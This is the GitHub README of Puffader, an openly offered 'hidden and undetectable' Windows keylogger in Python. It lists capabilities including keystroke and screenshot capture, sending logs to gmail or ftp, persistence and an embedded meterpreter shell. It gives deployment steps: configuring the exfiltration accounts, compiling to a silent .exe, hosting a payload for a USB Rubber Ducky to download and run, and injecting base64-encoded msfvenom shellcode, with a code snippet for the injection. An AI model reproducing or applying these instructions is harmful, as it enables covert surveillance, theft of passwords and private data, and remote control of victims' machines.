[![Build status](https://ci.appveyor.com/api/projects/status/5tc6085mmmw6rym8?svg=true)](https://ci.appveyor.com/project/xp4xbox/puffader)
# Puffader
Puffader is an opensource, hidden and undetectable keylogger for windows written in Python 2.7 which can also capture screenshots and mouse window clicks.

## Installation
Puffader Requires:
* [Python 2.7](https://www.python.org/downloads)
* [Pyhook](https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/)
* [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)
* [PyAutoGui](https://pypi.python.org/pypi/PyAutoGUI)

Please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Installing-Prerequisites) for more information on installing prerequisites.

The program can be downloaded via github or git eg.
```git clone https://github.com/xp4xbox/Puffader```

## Features
Currently Puffader has several features such as:
* Ability to send logs to any gmail account.
* Ability to send logs via ftp
* Ability to capture screenshots
* Ability to store logs locally
* Ability to configure log size before sending
* Ability to send logs at timed intervals
* Ability to control how you want the backspace key to be outputed as.
* Ability to stop the program via ctrl-rshift-h.
* Ability to log special characters.
* Ability to embed an undetectable meterpreter shell
* Optional persistence.
* Ability to capture window mouse clicks
* Checking for multiple instances
* USB Rubber Ducky payload
* And more...

## Quick Usage

1. Open file with idle or any other editor.
2. Modifiy lines `22-45` for your personal preference: eg.
```
strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnFTP = "False"
strFtpServer = ""
intFtpPort = 21
strFtpUser = ""
strFtpPass = ""
strFtpRemotePath = "/"

intCharPerSend = 1000

blnUseTime = "False"
intTimePerSend = 120

blnStoreLocal = "True"
strLogFile = "c:/temp/test.txt"

blnLogClick = "True"
blnBackRemove = "True"

blnScrShot = "True"
strScrDir = "c:/temp"
intScrTime = 120
```
> NOTE: For `strScrDir`, be sure to leave out the last `/`.

#### If you plan to send messages via email, be sure to [allow access for less secure apps](https://myaccount.google.com/lesssecureapps) in your gmail account.

For more information please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Usage).

### Compiling Program To .exe

#### Py2Exe (recommmended)
1. Add this code to Puffader.py `sys.stderr = None` after the import statements to ensure no errors will show.
2. Install [Py2Exe](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/).
3. Run `python setup.py`

#### cx_Freeze
1. Add this code to Puffader.py `sys.stderr = None` after the import statements to ensure no errors will show.
2. Install cx_Freeze via `pip install cx_freeze`.
3. Run `python cx_freeze_setup.py build`.

Or refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Compiling-To-.exe) for more information.

## Using Persistence

Please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Persistence).

## USB Rubber Ducky Payload

1. Zip the compiled .exe's folder and upload it to any file sharing service.
2. Edit [payload.ps1](https://github.com/xp4xbox/Puffader/blob/master/USB_Rubber_Ducky_Payload/payload.ps1) setting `$url` to be the direct link to the .zip. `$ZipName` to be the .zip name and `$strFileDir` to be the folder name inside the .zip file.
3. Upload your payload.ps1 as well.
4. Set `$url` in [inject.txt](https://github.com/xp4xbox/Puffader/blob/master/USB_Rubber_Ducky_Payload/inject.txt) to be the direct link for payload.ps1.
5. Encode to inject.bin using [my encoder](https://www.instructables.com/id/USB-Rubber-Ducky-Script-Encoder-VBScript/) or any other one.
> TIP: Forking this project and using personal rep for changes is a alternative way to host the files.

## Adding Meterpreter Plugin

1. Generate raw shellcode using msfvenom (eg. xr8\x02...).
2. Encode the shellcode to base64 by using [this](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/base64encoder.py).
3. Move the [code_injector module](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/code_injector.py) to same dir as the program.
4. Paste in this code after the function to prevent multiple instances as [here](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/Puffader_Code_Addition.py). Setting b64shellcode to be your encrypted shellcode.
```
import code_injector, base64
# base64 shellcode
b64shellcode = ""
shellcode = base64.b64decode(b64shellcode)  # decrypt shellcode
pid = os.getpid()  # get current pid

code_injector.InjectShellCode(pid, shellcode)  # inject the shellcode into the program
```
5. Build program with Py2Exe using [setup.py](https://github.com/xp4xbox/Puffader/blob/master/Meterpreter_Plugin/setup.py) to compile the program to single .exe.

> Check my other project [PyEvade](https://github.com/xp4xbox/PyEvade) for more info on how this works.

## Help

If you need any help at all, feel free to post a "help" issue.

## Contributing

Contributing is encouraged and will help make a better program. Please refer to [this](https://gist.github.com/MarcDiethelm/7303312) before contributing.

## Disclaimer

This program must be used for legal purposes! I am not responsible for anything you do with it.

## License
[License](https://github.com/xp4xbox/Puffader/blob/master/LICENSE)
